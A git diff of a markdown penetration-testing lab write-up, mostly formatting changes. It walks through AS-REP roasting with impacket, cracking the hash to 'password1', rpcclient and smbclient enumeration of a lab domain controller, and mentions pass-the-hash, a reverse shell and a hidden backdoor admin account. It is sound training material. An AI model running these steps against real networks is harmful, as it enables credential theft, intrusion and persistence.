@@ -41,15 +41,14 @@ First, I prepared a file called `users.txt` containing a list of usernames I wan
 ```bash
 impacket-GetNPUsers cyberlabs.local/ -usersfile users.txt -request -dc-ip 192.168.1.233
 ```
-`impacket-GetNPUsers:` This script is used to request AS-REP hashes for users that have Kerberos pre-authentication disabled.
-`cyberlabs.local/:` This specifies the domain name.
-`-usersfile users.txt:` This tells the script to read usernames from the file users.txt.
-`-request:` This flag tells the script to actively request TGTs for those users.
-`-dc-ip 192.168.1.233`: This is the IP address of the Domain Controller to target.
+- `impacket-GetNPUsers:` This script is used to request AS-REP hashes for users that have Kerberos pre-authentication disabled. 
+- `cyberlabs.local/:` This specifies the domain name.
+- `-usersfile users.txt:` This tells the script to read usernames from the file users.txt.                
+- `-request:` This flag tells the script to actively request TGTs for those users.
+- `-dc-ip 192.168.1.233`: This is the IP address of the Domain Controller to target.
 
 **Result:**
-If a user is vulnerable (doesn’t require pre-authentication), their TGT will be returned in the form of a **Kerberos AS-REP hash**, which I saved into a file named `hashes.txt` for the next step. **Extracted AS-REP Hash:** : `
-$krb5asrep$23$BTarget@CYBERLABS.LOCAL:c4480233c4a762b114402fc9d8a53cd$7908763a4bbf19954c3d6e01038dabce6f908e529cb824d0a453e6b467096c13a676f29c0b0a8539c68f3b190c18859b1f3a61cbac5cf5996da02078a10ce78d7da8301a67a720a103e7e2097c0426cfdbb8e7f8409f59aa0247d777416a12c28bd18438a4ee9ea636950ae41c8a324654b696db2488d29d5a8add67bcda54bde2231d50b328c55af5ad3622f6bda3d332a3b75f1fdc00fc6336fb6e10e9e4adf31bccac5cf5996da02078c5c1aaa4a5f1d614b003b78c628b0bbdb59a4ce309b0a859c4c330354d096d1626eb8433e5d36d2506f6ef`
+If a user is vulnerable (doesn’t require pre-authentication), their TGT will be returned in the form of a **Kerberos AS-REP hash**, which I saved into a file named `hashes.txt` for the next step. **Extracted AS-REP Hash:** `$krb5asrep$23$BTarget@CYBERLABS.LOCAL:c4480233c4a762b114402fc9d8a53cd$7908763a4bbf19954c3d6e01038dabce6f908e529cb824d0a453e6b467096c13a676f29c0b0a8539c68f3b190c18859b1f3a61cbac5cf5996da02078a10ce78d7da8301a67a720a103e7e2097c0426cfdbb8e7f8409f59aa0247d777416a12c28bd18438a4ee9ea636950ae41c8a324654b696db2488d29d5a8add67bcda54bde2231d50b328c55af5ad3622f6bda3d332a3b75f1fdc00fc6336fb6e10e9e4adf31bccac5cf5996da02078c5c1aaa4a5f1d614b003b78c628b0bbdb59a4ce309b0a859c4c330354d096d1626eb8433e5d36d2506f6ef`
 
 **Step 2: Cracking the Hash**
 
@@ -57,16 +56,16 @@ Once the hash was collected, I used **John the Ripper**, a powerful password-cra
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
-`john:` Runs John the Ripper.
-`--wordlist=/usr/share/wordlists/rockyou.txt`: Specifies the rockyou.txt wordlist, one of the most widely used collections of leaked passwords.
-`hashes.txt:` This file contains the Kerberos hash retrieved earlier.
+- `john:` Runs John the Ripper.
+- `--wordlist=/usr/share/wordlists/rockyou.txt`: Specifies the rockyou.txt wordlist, one of the most widely used collections of leaked passwords.
+- `hashes.txt:` This file contains the Kerberos hash retrieved earlier.
 
 **Result:**
 John the Ripper tested many passwords from the wordlist and eventually found the correct one.
 
 **Final Result: I successfully cracked BTarget's password, it was:** **`password1`**. This confirmed that the user account was vulnerable to AS-REP Roasting due to weak password practices and a misconfigured Kerberos policy. This step gave me **valid credentials** for a real domain user, which I then used in the following attack phases (like RPC and SMB enumeration).
 
-![Password Cracked](images/password_cracked.png)
+![Password Cracked](images/cracked-password.PNG)
 
 ---
 
@@ -81,13 +80,12 @@ I connected to the RPC service on the Domain Controller using BTarget’s cracke
 ```bash
 rpcclient -U 'CYBERLABS.LOCAL\\BTarget' 192.168.1.233
 ```
-- `rpcclient`: The main enumeration tool.
-- `-U 'CYBERLABS.LOCAL\\BTarget'`: Specifies the domain and the user to authenticate with.
-- `192.168.1.233`: The IP address of the Domain Controller.
+- `rpcclient:` The main enumeration tool.
+- `-U 'CYBERLABS.LOCAL\\BTarget':` Specifies the domain and the user to authenticate with.
+- `192.168.1.233:` The IP address of the Domain Controller.
 Once connected, I got access to an RPC prompt where I could run enumeration commands.
 
-**Step 2: Enumerating Domain Users**: `rpcclient> enumdomusers` : This command retrieved a list of **all domain user accounts**. Among them were accounts like:
-- `Administrator`, `BTarget`, `AHart`, `SConnor`, `Lcyber`, `TAlma`, `svc-SharePoint`, etc.
+**Step 2: Enumerating Domain Users**: `rpcclient> enumdomusers` : This command retrieved a list of **all domain user accounts**. Among them were accounts like: `Administrator`, `BTarget`, `AHart`, `SConnor`, `Lcyber`, `TAlma`, `svc-SharePoint`, etc.
 This provided insight into **real users**, including potentially **service accounts** and **privileged identities**.
 
 **Step 3: Querying Specific User Information**: `rpcclient> queryuser 0x1f4`
@@ -99,8 +97,7 @@ The RID `0x1f4` corresponds to the built-in **Administrator account**. This comm
 This kind of info is helpful for assessing **account activity**, detecting old/unused accounts, and verifying if default accounts are active.
 
 **Step 4: Enumerating Groups**: `rpcclient> enumdomgroups`
-This command returned a list of all domain groups, including **high-privilege ones** like:
-- **Domain Admins**, **Enterprise Admins**, **Schema Admins**, **Key Admins**, **Group Policy Creator Owners**
+This command returned a list of all domain groups, including **high-privilege ones** like: **Domain Admins**, **Enterprise Admins**, **Schema Admins**, **Key Admins**, **Group Policy Creator Owners**
 These groups often control critical parts of the domain — identifying them is key for building privilege escalation paths.
 
 **Final Result:**
@@ -109,7 +106,7 @@ These groups often control critical parts of the domain — identifying them is 
 - I retrieved **user attributes** and **group memberships**.
 - This enumeration step strengthened my internal mapping of the Active Directory structure and helped prepare for later attacks like BloodHound analysis and SMB share discovery.
 
-![RPC Enumeration](images/rpc-enum.png)
+![RPC Enumeration](images/enum-rpc.PNG)
 
 ---
 
@@ -123,9 +120,9 @@ I first listed all available shares exposed by the Domain Controller:
 ```bash
 smbclient -L //192.168.1.233 -U BTarget
 ```
-- `-L`: List available shares on the target machine.
-- `//192.168.1.233`: Target host (the Domain Controller).
-- `-U BTarget`: Authenticate as user BTarget.
+- `-L:` List available shares on the target machine.
+- `//192.168.1.233:` Target host (the Domain Controller).
+- `-U BTarget:` Authenticate as user BTarget.
 
 **Result:**
 Successfully connected using `BTarget:password1`. Discovered the following default Windows shares:
@@ -134,22 +131,20 @@ Successfully connected using `BTarget:password1`. Discovered the following defau
 - **IPC$** – Inter-Process Communication
 - **NETLOGON** – Contains logon scripts and domain policies (readable)
 - **SYSVOL** – Holds domain-wide Group Policy Objects and configuration files (readable)
+
 **NETLOGON** and **SYSVOL** were **accessible with standard domain user permissions**.
 
 **Step 2: Accessing the SYSVOL Share**
 
-```bash
-smbclient //192.168.1.233/SYSVOL -U BTarget
-smb: \> ls
-```
-The directory `cyberlabs.local` (the domain name) was present. I navigated into it: `cd cyberlabs.local\\scripts`, `ls`: The **scripts** folder was empty, this is normal for a newly set up domain where no login scripts have been defined.
+`smbclient //192.168.1.233/SYSVOL -U BTarget`, `smb: \> ls`. The directory `cyberlabs.local` (the domain name) was present. I navigated into it: `cd cyberlabs.local\\scripts`, `ls:` The **scripts** folder was empty, this is normal for a newly set up domain where no login scripts have been defined.
 This confirms that **BTarget** had **read access** to SYSVOL, a typical **post-exploitation pivot point** in Active Directory environments.
 
 **Step 3: Exploring Group Policy Configuration**
 
-`cd Policies`: I Found two key Group Policy folders:
-- `{31B2F340-016D-11D2-945F-00C04FB984F9}` – Default Domain Policy
-- `{6AC1786C-016F-11D2-945F-00C04FB984F9}` – Default Domain Controllers Policy 
+`cd Policies:` I Found two key Group Policy folders:
+- `{31B2F340-016D-11D2-945F-00C04FB984F9}`: Default Domain Policy
+- `{6AC1786C-016F-11D2-945F-00C04FB984F9}`: Default Domain Controllers Policy 
+
 Navigated into the first one: `cd "{31B2F340-016D-11D2-945F-00C04FB984F9}"`and discovered the following structure:
 - **GPT.INI** – A versioning file that tracks Group Policy changes
 - **MACHINE/** – Contains policies that apply to computers
@@ -160,14 +155,11 @@ Navigated into the first one: `cd "{31B2F340-016D-11D2-945F-00C04FB984F9}"`and d
 Downloaded and reviewed the GPT.INI file: `get GPT.INI`, `cat GPT.INI` : Content: `[General]`, `Version=11`
 This indicates the version of the policy, updated whenever changes are made to GPO settings.
 
+![SMB Enumeration](images/smb_enum.png)
+
 **Step 5: Getting Policy Rules**
 
-Navigated to the MACHINE directory and downloaded the **Registry.pol** file:
-```bash
-cd MACHINE
-ls
-get Registry.pol
-```
+Navigated to the MACHINE directory and downloaded the **Registry.pol** file: `cd MACHINE`, `ls`, `get Registry.pol`
 `Registry.pol` contains the **actual policy rules** (like password complexity, RDP settings, service permissions, etc.).  
 Note: It is in binary format and cannot be viewed directly with `cat`.
 
@@ -177,8 +169,6 @@ Through SMB enumeration, I was able to:
 - Navigate inside GPO structures and download key files
 - Confirm **post-exploitation read access** with a low-privileged domain user
 - Extract important domain configuration elements used to maintain security and policy enforcement in the environment
-
-![SMB Enumeration](images/smb_enum.png)
 
 ---
 
@@ -249,7 +239,7 @@ These shares contain sensitive configuration files and serve as pivot points for
 **Real-World Implication:**  
 PTH attacks allow adversaries to **spread across systems silently**, reusing hash values and bypassing traditional password protections. It is especially dangerous when combined with other privilege escalation methods or service misconfigurations.
 
-![PTH Success](images/pth_success.png)
+![PTH Success](images/success-pth.PNG)
 
 ---
 
@@ -342,7 +332,7 @@ tasklist      # Lists all running processes on the system.
 ```
 Confirmed full administrative privileges.
 
-![Reverse Shell Access](images/reverse_shell.png)
+![Reverse Shell Access](images/reverse-shell.PNG)
 
 ### 4.8 Creating a Text File (Proof of System Compromise)
 
@@ -369,8 +359,6 @@ Successfully established a **backdoor administrative user** for persistent acces
 - Validated control over the system via enumeration commands.
 - Created a **new hidden Administrator account** ensuring long-term persistence.
 - Demonstrated complete post-exploitation capabilities typical of real-world threat actors.
-
-![GhostUser Created](images/ghostuser_created.png)
 
 ---
 
